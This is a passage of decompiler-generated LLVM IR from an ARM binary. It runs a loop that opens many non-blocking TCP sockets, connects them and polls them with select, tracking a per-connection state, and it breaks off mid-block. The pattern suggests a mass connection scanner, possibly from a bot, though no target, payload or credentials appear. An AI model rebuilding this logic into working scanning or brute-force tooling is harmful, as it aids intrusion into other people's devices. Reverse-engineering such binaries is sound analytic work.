  %stack_var_-20864.0.ph = phi i32 [ %v3_a584, %dec_label_pc_a574 ], [ %v3_8c18, %dec_label_pc_8c08 ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_a58c, %dec_label_pc_a574 ], [ %v2_8c20, %dec_label_pc_8c08 ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_a588, %dec_label_pc_a574 ], [ %v1_8c1c, %dec_label_pc_8c08 ]
  %v1_a590 = urem i32 %v0_a584.sink, 256
  store i32 %v1_a590, i32* @r7, align 4
  %v2_8da0 = ptrtoint i32* %stack_var_-152 to i32
  %v2_8db8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8e00 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8e1c = ptrtoint i32* %stack_var_-40 to i32
  %v1_8ffc = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_9358 = icmp eq i32 %v6_8908, 0
  %v1_9254 = inttoptr i32 %v6_8908 to i8*
  %v2_8e84 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8e88 = ptrtoint i32* %stack_var_-204 to i32
  %v2_8e8c = ptrtoint i32* %stack_var_-332 to i32
  %v2_8f6c = ptrtoint i32* %stack_var_-48 to i32
  %v2_8f78 = ptrtoint i32* %stack_var_-52 to i32
  %v4_8dd8 = mul nuw nsw i32 %v1_a590, 256
  %v5_8dd8 = or i32 %v4_8dd8, %stack_var_-20864.0.ph
  br label %dec_label_pc_8c38

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8e64, %dec_label_pc_8c98, %dec_label_pc_8e5c, %dec_label_pc_8ef8, %dec_label_pc_8c38.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8c3c = call i32 @__GI_time(i32* null)
  store i32 %v2_8c3c, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8c68225 = load i32, i32* @sp, align 4
  %v3_8c68226 = add i32 %v2_8c68225, 20688
  %v4_8c68227 = inttoptr i32 %v3_8c68226 to i32*
  store i32 0, i32* %v4_8c68227, align 4
  br label %dec_label_pc_8c54.dec_label_pc_8c54_crit_edge

dec_label_pc_8c54.dec_label_pc_8c54_crit_edge:    ; preds = %dec_label_pc_8c38, %dec_label_pc_8c54.dec_label_pc_8c54_crit_edge
  %v0_8c54.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8c58 = add i32 %v0_8c54.pre, 4
  store i32 %v1_8c58, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8c60 = add i32 %v0_8c54.pre, 20684
  store i32 %v1_8c60, i32* @lr, align 4
  %v7_8c64 = icmp eq i32 %v1_8c58, 128
  %v2_8c68 = load i32, i32* @sp, align 4
  %v3_8c68 = add i32 %v2_8c68, %v1_8c60
  %v4_8c68 = inttoptr i32 %v3_8c68 to i32*
  store i32 0, i32* %v4_8c68, align 4
  br i1 %v7_8c64, label %dec_label_pc_8c70, label %dec_label_pc_8c54.dec_label_pc_8c54_crit_edge

dec_label_pc_8c70:                                ; preds = %dec_label_pc_8c54.dec_label_pc_8c54_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_89fc, i32* @r1, align 4
  %v0_8c74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8c74, i32* %stack_var_-332, align 4
  %v0_8c78 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c80228 = add i32 %v0_8c78, -120
  store i32 %v1_8c80228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8c88229 = add i32 %v0_8c78, 20432
  store i32 %v1_8c88229, i32* %r2.global-to-local, align 4
  %v7_8c8c230 = icmp eq i32 %v1_8c80228, 128
  %v2_8c90231 = load i32, i32* @sp, align 4
  %v3_8c90232 = add i32 %v2_8c90231, %v1_8c88229
  %v4_8c90233 = inttoptr i32 %v3_8c90232 to i32*
  store i32 0, i32* %v4_8c90233, align 4
  br i1 %v7_8c8c230, label %dec_label_pc_8c98, label %dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge

dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge:    ; preds = %dec_label_pc_8c70, %dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge
  %v0_8c7c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8c80 = add i32 %v0_8c7c.pre, 4
  store i32 %v1_8c80, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8c88 = add i32 %v0_8c7c.pre, 20556
  store i32 %v1_8c88, i32* %r2.global-to-local, align 4
  %v7_8c8c = icmp eq i32 %v1_8c80, 128
  %v2_8c90 = load i32, i32* @sp, align 4
  %v3_8c90 = add i32 %v2_8c90, %v1_8c88
  %v4_8c90 = inttoptr i32 %v3_8c90 to i32*
  store i32 0, i32* %v4_8c90, align 4
  br i1 %v7_8c8c, label %dec_label_pc_8c98, label %dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge

dec_label_pc_8c98:                                ; preds = %dec_label_pc_8c7c.dec_label_pc_8c7c_crit_edge, %dec_label_pc_8c70
  store i32 %v0_8aa8, i32* %r3.global-to-local, align 4
  %v1_8c9c = load i32, i32* %r0.global-to-local, align 4
  %v3_8c9c = icmp uge i32 %v0_8aa8, %v1_8c9c
  store i1 %v3_8c9c, i1* %cpsr_c.global-to-local, align 1
  %v9_8c9c = icmp eq i32 %v0_8aa8, %v1_8c9c
  store i1 %v9_8c9c, i1* %cpsr_z.global-to-local, align 1
  %v7_8ca0 = icmp sgt i32 %v0_8aa8, %v1_8c9c
  br i1 %v7_8ca0, label %dec_label_pc_8ca4, label %dec_label_pc_8c38

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8c98
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8c9c, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8c9c, i32* @r7, align 4
  br label %dec_label_pc_8d18

dec_label_pc_8cb8:                                ; preds = %dec_label_pc_8d2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_8cb8 = icmp eq i8 %v3_8d18, 2
  store i1 %v7_8cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8cb8, label %dec_label_pc_93f8, label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8cb8
  %v2_8cc0 = icmp ugt i8 %v3_8d18, 3
  store i1 %v2_8cc0, i1* %cpsr_c.global-to-local, align 1
  %v7_8cc0 = icmp eq i8 %v3_8d18, 4
  store i1 %v7_8cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8cc0, label %dec_label_pc_8fc8, label %dec_label_pc_8cc8

dec_label_pc_8cc8:                                ; preds = %dec_label_pc_8cc0
  %v1_8cc8 = add nsw i32 %v4_8d18, -6
  %v2_8cc8 = icmp ugt i8 %v3_8d18, 5
  store i1 %v2_8cc8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cc8 = icmp eq i8 %v3_8d18, 6
  store i1 %v7_8cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8cc8, label %dec_label_pc_9428, label %dec_label_pc_8cd0

dec_label_pc_8cd0:                                ; preds = %dec_label_pc_8cc8
  %v2_8cd0 = icmp ugt i8 %v3_8d18, 6
  store i1 %v2_8cd0, i1* %cpsr_c.global-to-local, align 1
  %v7_8cd0 = icmp eq i8 %v3_8d18, 7
  store i1 %v7_8cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8cd0, label %dec_label_pc_9664, label %dec_label_pc_8cd8

dec_label_pc_8cd8:                                ; preds = %dec_label_pc_8cd0
  %v2_8cd8 = icmp ugt i8 %v3_8d18, 9
  store i1 %v2_8cd8, i1* %cpsr_c.global-to-local, align 1
  %v7_8cd8 = icmp eq i8 %v3_8d18, 10
  store i1 %v7_8cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8cd8, label %dec_label_pc_96b8, label %dec_label_pc_8ce0

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8cd8
  %v1_8ce0 = add nsw i32 %v4_8d18, -11
  %v2_8ce0 = icmp ugt i8 %v3_8d18, 10
  store i1 %v2_8ce0, i1* %cpsr_c.global-to-local, align 1
  %v7_8ce0 = icmp eq i8 %v3_8d18, 11
  store i1 %v7_8ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ce0, label %dec_label_pc_9c78, label %dec_label_pc_8ce8

dec_label_pc_8ce8:                                ; preds = %dec_label_pc_93f8, %dec_label_pc_8ce0
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_8d18, align 1
  %v0_8cf0 = load i32, i32* @r6, align 4
  %v1_8cf0 = add i32 %v0_8cf0, -1452
  %v2_8cf0 = inttoptr i32 %v1_8cf0 to i32*
  %v3_8cf0 = load i32, i32* %v2_8cf0, align 4
  store i32 %v3_8cf0, i32* %r0.global-to-local, align 4
  %v1_8cf4 = call i32 @__GI___libc_close(i32 %v3_8cf0)
  store i32 %v1_8cf4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8cfc = load i32, i32* @r6, align 4
  %v2_8cfc = add i32 %v1_8cfc, -1452
  %v3_8cfc = inttoptr i32 %v2_8cfc to i32*
  store i32 -1, i32* %v3_8cfc, align 4
  br label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_96b8, %dec_label_pc_9664, %dec_label_pc_9428, %dec_label_pc_8e24, %dec_label_pc_8d34, %bb180, %dec_label_pc_9c78, %dec_label_pc_8ce8
  store i32 %v0_8aa8, i32* %r2.global-to-local, align 4
  %v0_8d04 = load i32, i32* @r7, align 4
  %v1_8d04 = add i32 %v0_8d04, 1
  store i32 %v1_8d04, i32* @r7, align 4
  %v0_8d08 = load i32, i32* @r6, align 4
  %v3_8d0c = icmp uge i32 %v1_8d04, %v0_8aa8
  store i1 %v3_8d0c, i1* %cpsr_c.global-to-local, align 1
  %v9_8d0c = icmp eq i32 %v1_8d04, %v0_8aa8
  store i1 %v9_8d0c, i1* %cpsr_z.global-to-local, align 1
  %v1_8d10 = add i32 %v0_8d08, 3140
  store i32 %v1_8d10, i32* @r6, align 4
  br i1 %v9_8d0c, label %dec_label_pc_8d00.dec_label_pc_8e5c_crit_edge, label %dec_label_pc_8d18

dec_label_pc_8d00.dec_label_pc_8e5c_crit_edge:    ; preds = %dec_label_pc_8d00
  %v0_8e5c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8e5c

dec_label_pc_8d18:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8d00, %dec_label_pc_8ca4
  %v3_8fbc = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8ca4 ], [ %v1_8d10, %dec_label_pc_8d00 ], [ %v1_8e54, %dec_label_pc_8e44 ]
  %v1_8d18 = add i32 %v3_8fbc, -1448
  %v2_8d18 = inttoptr i32 %v1_8d18 to i8*
  %v3_8d18 = load i8, i8* %v2_8d18, align 1
  %v4_8d18 = zext i8 %v3_8d18 to i32
  store i32 %v4_8d18, i32* @r3, align 4
  %v2_8d20 = icmp ne i8 %v3_8d18, 0
  store i1 %v2_8d20, i1* %cpsr_c.global-to-local, align 1
  %v6_8d20 = icmp eq i8 %v3_8d18, 0
  %v7_8d20 = icmp eq i8 %v3_8d18, 1
  store i1 %v7_8d20, i1* %cpsr_z.global-to-local, align 1
  %v1_8d24 = add i32 %v3_8fbc, -1452
  store i32 %v1_8d24, i32* @r5, align 4
  br i1 %v7_8d20, label %dec_label_pc_8fb0, label %dec_label_pc_8d2c

dec_label_pc_8d2c:                                ; preds = %dec_label_pc_8d18
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_8d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8d20, label %dec_label_pc_8d34, label %dec_label_pc_8cb8

dec_label_pc_8d34:                                ; preds = %.thread19.dec_label_pc_8d34_crit_edge, %dec_label_pc_8d2c
  %v0_8d34 = phi i32 [ %v0_8d34.pre, %.thread19.dec_label_pc_8d34_crit_edge ], [ %v3_8fbc, %dec_label_pc_8d2c ]
  %v1_8d34 = add i32 %v0_8d34, -1452
  %v2_8d34 = inttoptr i32 %v1_8d34 to i32*
  %v3_8d34 = load i32, i32* %v2_8d34, align 4
  store i32 %v3_8d34, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_89fc, i32* %ip.global-to-local, align 4
  %v2_8d40 = icmp eq i32 %v3_8d34, -1
  store i1 %v2_8d40, i1* %cpsr_c.global-to-local, align 1
  %v7_8d40 = icmp eq i32 %v3_8d34, -1
  store i1 %v7_8d40, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 36184, i32* @lr, align 4
  %v1_8d54 = xor i1 %v7_8d40, true
  call void @__pseudo_cond_branch(i1 %v1_8d54, i32 ptrtoint (i32* @global_var_16360.61 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v0_8d60 = load i32, i32* @r5, align 4
  store i32 %v0_8d60, i32* %r2.global-to-local, align 4
  %v3_8d64 = call i32 @socket(i32 2, i32 1, i32 %v0_8d60)
  store i32 %v3_8d64, i32* %r0.global-to-local, align 4
  %v2_8d68 = icmp eq i32 %v3_8d64, -1
  store i1 %v2_8d68, i1* %cpsr_c.global-to-local, align 1
  %v7_8d68 = icmp eq i32 %v3_8d64, -1
  store i1 %v7_8d68, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8d64, i32* @r4, align 4
  %v1_8d70 = load i32, i32* @r6, align 4
  %v2_8d70 = add i32 %v1_8d70, -1452
  %v3_8d70 = inttoptr i32 %v2_8d70 to i32*
  store i32 %v3_8d64, i32* %v3_8d70, align 4
  br i1 %v7_8d68, label %dec_label_pc_8d00, label %dec_label_pc_8d78

dec_label_pc_8d78:                                ; preds = %dec_label_pc_8d34
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8d7c = load i32, i32* @r5, align 4
  store i32 %v0_8d7c, i32* @r2, align 4
  %v2_8d80 = call i32 @__libc_fcntl(i32 %v3_8d64, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_8d88 = or i32 %v2_8d80, 2048
  store i32 %v1_8d88, i32* @r2, align 4
  %v0_8d8c = load i32, i32* @r4, align 4
  store i32 %v0_8d8c, i32* %r0.global-to-local, align 4
  %v2_8d90 = call i32 @__libc_fcntl(i32 %v0_8d8c, i32 4)
  store i32 %v2_8d90, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_8da0, i32* %r3.global-to-local, align 4
  %v0_8da4 = load i32, i32* @r6, align 4
  %v1_8da4 = add i32 %v0_8da4, -1452
  %v2_8da4 = inttoptr i32 %v1_8da4 to i32*
  %v3_8da4 = load i32, i32* %v2_8da4, align 4
  store i32 %v3_8da4, i32* %r0.global-to-local, align 4
  %v0_8da8 = load i32, i32* @r5, align 4
  store i32 %v0_8da8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_8db8, i32* %r3.global-to-local, align 4
  %v5_8dc0 = call i32 @__GI_setsockopt(i32 %v3_8da4, i32 %v0_8da8, i32 8, i32 %v2_8db8, i32 4)
  store i32 %v5_8dc0, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_a590, i32* %r2.global-to-local, align 4
  %v0_8dcc = load i32, i32* @r6, align 4
  %v1_8dcc = add i32 %v0_8dcc, -1436
  %v2_8dcc = inttoptr i32 %v1_8dcc to i32*
  %v3_8dcc = load i32, i32* %v2_8dcc, align 4
  store i32 %v3_8dcc, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_8dd8, i32* %r3.global-to-local, align 4
  %v1_8ddc = add i32 %v0_8dcc, -1452
  %v2_8ddc = inttoptr i32 %v1_8ddc to i32*
  %v3_8ddc = load i32, i32* %v2_8ddc, align 4
  store i32 %v3_8ddc, i32* %r0.global-to-local, align 4
  %v3_8dec = add i32 %v0_8dcc, -1448
  %v4_8dec = inttoptr i32 %v3_8dec to i8*
  store i8 2, i8* %v4_8dec, align 1
  store i32 %v2_8c3c, i32* %r3.global-to-local, align 4
  %v0_8df8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_8df8, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_8e00, i32* %r1.global-to-local, align 4
  %v1_8e04 = load i32, i32* @r6, align 4
  %v2_8e04 = add i32 %v1_8e04, -1444
  %v3_8e04 = inttoptr i32 %v2_8e04 to i32*
  store i32 %v2_8c3c, i32* %v3_8e04, align 4
  %v3_8e08 = call i32 @__libc_connect(i32 %v3_8ddc, i32 %v2_8e00, i32 16)
  store i32 %v3_8e08, i32* %r0.global-to-local, align 4
  %v0_8e0c = load i32, i32* @r6, align 4
  %v1_8e0c = add i32 %v0_8e0c, -1452
  %v2_8e0c = inttoptr i32 %v1_8e0c to i32*
  %v3_8e0c = load i32, i32* %v2_8e0c, align 4
  store i32 %v3_8e0c, i32* %ip.global-to-local, align 4
  %v3_8e14 = udiv i32 %v3_8e0c, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8e18 = mul nuw nsw i32 %v3_8e14, 4
  store i32 %v3_8e18, i32* %r2.global-to-local, align 4
  store i32 %v2_8e1c, i32* @lr, align 4
  br label %dec_label_pc_8e24

dec_label_pc_8e24:                                ; preds = %dec_label_pc_940c, %dec_label_pc_8d78
  %v0_8e34 = phi i32 [ %v3_8e0c, %dec_label_pc_8d78 ], [ %v3_940c, %dec_label_pc_940c ]
  %v3_8e18.pn = phi i32 [ %v3_8e18, %dec_label_pc_8d78 ], [ %v3_9418, %dec_label_pc_940c ]
  %storemerge = add i32 %v3_8e18.pn, %v2_8e1c
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_8e24 = add i32 %storemerge, -292
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  %v1_8e28 = urem i32 %v0_8e34, 32
  store i32 %v1_8e28, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8e30 = shl i32 1, %v1_8e28
  %v8_8e30 = or i32 %v3_8e24, %v7_8e30
  store i32 %v8_8e30, i32* @r1, align 4
  %v1_8e34 = load i32, i32* @r8, align 4
  %v2_8e34 = sub i32 %v0_8e34, %v1_8e34
  %v3_8e34 = icmp uge i32 %v0_8e34, %v1_8e34
  store i1 %v3_8e34, i1* %cpsr_c.global-to-local, align 1
  %v4_8e34 = xor i32 %v1_8e34, %v0_8e34
  %v5_8e34 = xor i32 %v2_8e34, %v0_8e34
  %v6_8e34 = and i32 %v5_8e34, %v4_8e34
  %v7_8e34 = icmp slt i32 %v6_8e34, 0
  %v8_8e34 = icmp slt i32 %v2_8e34, 0
  %v9_8e34 = icmp eq i32 %v0_8e34, %v1_8e34
  store i1 %v9_8e34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8e30, i32* %v2_8e24, align 4
  %v3_8e3c = xor i1 %v8_8e34, %v7_8e34
  %v4_8e3c = or i1 %v9_8e34, %v3_8e3c
  br i1 %v4_8e3c, label %dec_label_pc_8d00, label %dec_label_pc_8e40

dec_label_pc_8e40:                                ; preds = %dec_label_pc_8e24
  %v0_8e40 = load i32, i32* %ip.global-to-local, align 4
  %v1_8e40 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e40 = add i32 %v1_8e40, %v0_8e40
  store i32 %v2_8e40, i32* @r8, align 4
  br label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_96ec, %dec_label_pc_9698, %dec_label_pc_945c, %dec_label_pc_8e40
  %v0_8e5c65 = phi i32 [ %v2_96ec, %dec_label_pc_96ec ], [ %v2_9698, %dec_label_pc_9698 ], [ %v2_945c, %dec_label_pc_945c ], [ %v2_8e40, %dec_label_pc_8e40 ]
  store i32 %v0_8aa8, i32* %r2.global-to-local, align 4
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 1
  store i32 %v1_8e48, i32* @r7, align 4
  %v0_8e4c = load i32, i32* @r6, align 4
  %v3_8e50 = icmp uge i32 %v1_8e48, %v0_8aa8
  store i1 %v3_8e50, i1* %cpsr_c.global-to-local, align 1
  %v9_8e50 = icmp eq i32 %v1_8e48, %v0_8aa8
  store i1 %v9_8e50, i1* %cpsr_z.global-to-local, align 1
  %v1_8e54 = add i32 %v0_8e4c, 3140
  store i32 %v1_8e54, i32* @r6, align 4
  br i1 %v9_8e50, label %dec_label_pc_8e5c, label %dec_label_pc_8d18

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8d00.dec_label_pc_8e5c_crit_edge
  %v0_8e94 = phi i32 [ %v0_8e5c.pre, %dec_label_pc_8d00.dec_label_pc_8e5c_crit_edge ], [ %v0_8e5c65, %dec_label_pc_8e44 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e5c = icmp eq i32 %v0_8e94, 0
  store i1 %v2_8e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e5c, label %dec_label_pc_8c38, label %dec_label_pc_8e64

dec_label_pc_8e64:                                ; preds = %dec_label_pc_8e5c
  store i32 %v10_89fc, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8e84, i32* %ip.global-to-local, align 4
  store i32 %v2_8e88, i32* %r1.global-to-local, align 4
  store i32 %v2_8e8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8e94, i32* %r0.global-to-local, align 4
  %v5_8e9c = call i32 @__libc_select(i32 %v0_8e94, i32 %v2_8e88, i32 %v2_8e8c, i32 0, i32 %v2_8e84)
  store i32 %v5_8e9c, i32* @r4, align 4
  %v0_8ea4 = load i32, i32* @r5, align 4
  store i32 %v0_8ea4, i32* %r0.global-to-local, align 4
  %v1_8ea8 = inttoptr i32 %v0_8ea4 to i32*
  %v2_8ea8 = call i32 @__GI_time(i32* %v1_8ea8)
  store i32 %v2_8ea8, i32* %r0.global-to-local, align 4
  %v0_8eac = load i32, i32* @r4, align 4
  %v1_8eac = load i32, i32* @r5, align 4
  %v3_8eac = icmp uge i32 %v0_8eac, %v1_8eac
  store i1 %v3_8eac, i1* %cpsr_c.global-to-local, align 1
  %v9_8eac = icmp eq i32 %v0_8eac, %v1_8eac
  store i1 %v9_8eac, i1* %cpsr_z.global-to-local, align 1
  %v7_8eb4 = icmp sgt i32 %v0_8eac, %v1_8eac
  br i1 %v7_8eb4, label %dec_label_pc_8eb8, label %dec_label_pc_8c38

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e64
  %v0_8f18.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8f18

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8f2c, %dec_label_pc_8f98
  %v1_8ed0 = phi i32 [ %v1_8f44, %dec_label_pc_8f2c ], [ %v1_8ed0.pre, %dec_label_pc_8f98 ]
  %v0_8ec8 = phi i32 [ %v3_8f34, %dec_label_pc_8f2c ], [ %v0_8ec8.pre, %dec_label_pc_8f98 ]
  store i32 %v2_8e1c, i32* %r3.global-to-local, align 4
  %v2_8ec8 = add i32 %v0_8ec8, %v2_8e1c
  store i32 %v2_8ec8, i32* %r2.global-to-local, align 4
  %v1_8ecc = add i32 %v2_8ec8, -164
  %v2_8ecc = inttoptr i32 %v1_8ecc to i32*
  %v3_8ecc = load i32, i32* %v2_8ecc, align 4
  %v2_8ed0 = add i32 %v1_8ed0, -1
  %v3_8ed0 = shl i32 1, %v2_8ed0
  %v4_8ed0 = and i32 %v3_8ecc, %v3_8ed0
  %v5_8ed0 = icmp ne i32 %v4_8ed0, 0
  store i1 %v5_8ed0, i1* %cpsr_c.global-to-local, align 1
  %v6_8ed0 = ashr i32 %v3_8ecc, %v1_8ed0
  store i32 %v6_8ed0, i32* %r3.global-to-local, align 4
  %v1_8ed4 = urem i32 %v6_8ed0, 2
  %v2_8ed4 = icmp eq i32 %v1_8ed4, 0
  store i1 %v2_8ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ed4, label %dec_label_pc_8ef8, label %dec_label_pc_8edc

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec0
  %v0_8edc = load i32, i32* @sl, align 4
  %v1_8edc = add i32 %v0_8edc, -1448
  %v2_8edc = inttoptr i32 %v1_8edc to i8*
  %v3_8edc = load i8, i8* %v2_8edc, align 1
  %v4_8edc = zext i8 %v3_8edc to i32
  store i32 %v4_8edc, i32* %r3.global-to-local, align 4
  %v2_8ee0 = icmp ugt i8 %v3_8edc, 5
  store i1 %v2_8ee0, i1* %cpsr_c.global-to-local, align 1
  %v7_8ee0 = icmp eq i8 %v3_8edc, 6
  store i1 %v7_8ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ee0, label %dec_label_pc_9734, label %dec_label_pc_8ee8

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8edc
  %v2_8ee8 = icmp ugt i8 %v3_8edc, 6
  store i1 %v2_8ee8, i1* %cpsr_c.global-to-local, align 1
  %v7_8ee8 = icmp eq i8 %v3_8edc, 7
  store i1 %v7_8ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ee8, label %dec_label_pc_9464, label %dec_label_pc_8ef0

dec_label_pc_8ef0:                                ; preds = %dec_label_pc_8ee8
  %v2_8ef0 = icmp ugt i8 %v3_8edc, 9
  store i1 %v2_8ef0, i1* %cpsr_c.global-to-local, align 1
  %v7_8ef0 = icmp eq i8 %v3_8edc, 10
  store i1 %v7_8ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ef0, label %dec_label_pc_9d6c, label %dec_label_pc_8ef8

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_9564, %dec_label_pc_9784, %dec_label_pc_8ef0, %dec_label_pc_8ec0, %dec_label_pc_8f18, %dec_label_pc_9dfc, %dec_label_pc_9dac, %dec_label_pc_a24c, %dec_label_pc_a0f8, %dec_label_pc_a080, %dec_label_pc_a024, %dec_label_pc_9c5c, %dec_label_pc_96a0, %dec_label_pc_9e08, %dec_label_pc_9dd8, %dec_label_pc_9dbc, %dec_label_pc_9d60
  store i32 %v0_8aa8, i32* %r3.global-to-local, align 4
  %v1_8f00 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_8f00, i32* %r2.global-to-local, align 4
  %v0_8f04 = load i32, i32* @sl, align 4
  %v3_8f08 = icmp uge i32 %v1_8f00, %v0_8aa8
  store i1 %v3_8f08, i1* %cpsr_c.global-to-local, align 1
  %v9_8f08 = icmp eq i32 %v1_8f00, %v0_8aa8
  store i1 %v9_8f08, i1* %cpsr_z.global-to-local, align 1
  %v1_8f10 = add i32 %v0_8f04, 3140
  store i32 %v1_8f10, i32* @sl, align 4
  br i1 %v9_8f08, label %dec_label_pc_8c38, label %dec_label_pc_8f18

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8ef8, %dec_label_pc_8eb8
  %v0_8f18 = phi i32 [ %v0_8f18.pre, %dec_label_pc_8eb8 ], [ %v1_8f10, %dec_label_pc_8ef8 ]
  %stack_var_-20820.0 = phi i32 [ %v1_8eac, %dec_label_pc_8eb8 ], [ %v1_8f00, %dec_label_pc_8ef8 ]
  %v1_8f18 = add i32 %v0_8f18, -1452
  %v2_8f18 = inttoptr i32 %v1_8f18 to i32*
  %v3_8f18 = load i32, i32* %v2_8f18, align 4
  store i32 %v3_8f18, i32* %r0.global-to-local, align 4
  %v2_8f20 = icmp eq i32 %v3_8f18, -1
  store i1 %v2_8f20, i1* %cpsr_c.global-to-local, align 1
  %v7_8f20 = icmp eq i32 %v3_8f18, -1
  store i1 %v7_8f20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f18, i32* %sb.global-to-local, align 4
  br i1 %v7_8f20, label %dec_label_pc_8ef8, label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8f18
  %v3_8f2c = udiv i32 %v3_8f18, 32
  %v3_8f34 = mul nuw nsw i32 %v3_8f2c, 4
  store i32 %v3_8f34, i32* @ip, align 4
  store i32 %v2_8e1c, i32* @lr, align 4
  %v2_8f3c = add i32 %v3_8f34, %v2_8e1c
  store i32 %v2_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = add i32 %v2_8f3c, -292
  %v2_8f40 = inttoptr i32 %v1_8f40 to i32*
  %v3_8f40 = load i32, i32* %v2_8f40, align 4
  %v1_8f44 = urem i32 %v3_8f18, 32
  store i32 %v1_8f44, i32* %r1.global-to-local, align 4
  %v2_8f48 = add nsw i32 %v1_8f44, -1
  %v3_8f48 = shl i32 1, %v2_8f48
  %v4_8f48 = and i32 %v3_8f40, %v3_8f48
  %v5_8f48 = icmp ne i32 %v4_8f48, 0
  store i1 %v5_8f48, i1* %cpsr_c.global-to-local, align 1
  %v6_8f48 = ashr i32 %v3_8f40, %v1_8f44
